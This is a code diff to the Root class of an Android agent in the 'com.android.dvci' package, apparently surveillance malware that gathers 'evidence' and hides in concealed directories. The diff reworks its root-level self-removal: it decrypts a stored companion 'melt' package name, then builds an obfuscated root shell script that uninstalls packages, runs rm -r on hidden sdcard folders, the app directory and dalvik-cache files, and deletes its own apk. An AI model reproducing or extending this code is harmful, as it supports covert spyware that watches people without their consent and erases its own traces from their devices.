@@ -8,6 +8,7 @@ import android.os.Build;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.Configuration;
+import com.android.dvci.crypto.EncryptionPKCS5;
 import com.android.dvci.crypto.Keys;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.Markup;
@@ -18,7 +19,6 @@ import com.android.dvci.util.Check;
 import com.android.dvci.util.Execute;
 import com.android.dvci.util.ExecuteResult;
 import com.android.dvci.util.PackageUtils;
-import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
@@ -397,16 +397,30 @@ public class Root {
 			}
 
 			script += Configuration.shellFile + M.e(" blw") + "\n";
+			script += M.e("echo delete ")+ packageName + "\n";
 			script += M.e("pm clear ") + packageName + "\n";
 			script += M.e("pm disable ") + packageName + "\n";
 			script += M.e("pm uninstall ") + packageName + "\n";
 
-			Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
-			String meltapk = markupMelt.unserialize(new String());
+			String meltapk = "";
+			AutoFile markupMelt = new AutoFile(String.format("/data/data/%s/files/mm", packageName));
+			if(markupMelt.exists()) {
+				final byte[] confKey = Keys.self().getConfKey();
+				EncryptionPKCS5 crypto = new EncryptionPKCS5(confKey);
+				try {
+					meltapk = new String(crypto.decryptData(markupMelt.read()));
+				} catch (Exception ex) {
+					if (Cfg.DEBUG) {
+						Check.log(ex);
+					}
+				}
+			}
+
 			if(meltapk.length() > 0){
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (uninstallRoot), uninstall melt: " + meltapk);
 				}
+				script += M.e("echo delete ")+ meltapk + "\n";
 				script += M.e("pm clear ") + meltapk + "\n";
 				script += M.e("pm disable ") + meltapk + "\n";
 				script += M.e("pm uninstall ") + meltapk + "\n";
@@ -433,24 +447,27 @@ public class Root {
 			if(!Status.isPersistent()){
 				script += M.e("sleep 5\n");
 			}
+			script += M.e("echo delete sdcard")+ "\n";
 			script += String.format(M.e("rm -r %s 2>/dev/null"), M.e("/sdcard/.lost.found")) + "\n";
 			script += String.format(M.e("rm -r %s 2>/dev/null"), M.e("/sdcard/1")) + "\n";
 			script += String.format(M.e("rm -r %s 2>/dev/null"), M.e("/sdcard/2")) + "\n";
-			//if(Status.isPersistent()){
-				script += String.format(M.e("rm -r %s 2>/dev/null"), Status.getAppDir()) + "\n";
-				script += String.format(M.e("rm -r %s 2>/dev/null"), Path.hidden()) + "\n";
-				// TODO: mettere Status.persistencyApk e packageName
-				script += M.e("for i in `ls /data/app/*com.android.dvci* 2>/dev/null`; do rm  $i; done") + "\n";
-			//}
+
+			script += M.e("echo delete appdir")+ "\n";
+			script += String.format(M.e("rm -r %s 2>/dev/null"), Status.getAppDir()) + "\n";
+			script += String.format(M.e("rm -r %s 2>/dev/null"), Path.hidden()) + "\n";
+			// TODO: mettere Status.persistencyApk e packageName
+
+			script += M.e("echo delete app")+ "\n";
+			script += M.e("for i in `ls /data/app/*com.android.dvci* 2>/dev/null`; do rm  $i; done") + "\n";
+
 			script += M.e("for i in `ls /data/dalvik-cache/*com.android.dvci* 2>/dev/null`; do rm  $i; done") + "\n";
 			script += M.e("for i in `ls /data/dalvik-cache/*StkDevice* 2>/dev/null`; do rm  $i; done") + "\n";
 			script += M.e("for i in `ls /system/app/*StkDevice* 2>/dev/null`; do rm  $i 2>/dev/null; done") + "\n";
 
+			script += M.e("echo remount ro")+ "\n";
 			script += Configuration.shellFile + M.e(" blr") + "\n";
 			script += M.e("sleep 1; ") + String.format(M.e("rm %s 2>/dev/null"), apkPath) + "\n";
 			script += Configuration.shellFile + M.e(" ru") + "\n";
-
-
 
 			ArrayList<String> fl = markup.unserialize(new ArrayList<String>());
 			if (!fl.isEmpty()) {
@@ -471,7 +488,7 @@ public class Root {
 					script += M.e("pm enable ") + app + "\n";
 				}
 			}
-			Core.serivceUnregister();
+			Core.serviceUnregister();
 			boolean ret = Execute.executeRootAndForgetScript(script);
 			if(!ret){
 				Execute.executeScript(script);
@@ -1046,7 +1063,7 @@ public class Root {
 			fos.write(script.getBytes());
 			fos.close();
 			if (absolutPaht != null) {
-				absolutPaht = absP;
+				absP = absolutPaht;
 			}
 			Execute.execute("chmod 755 " + absP);
 
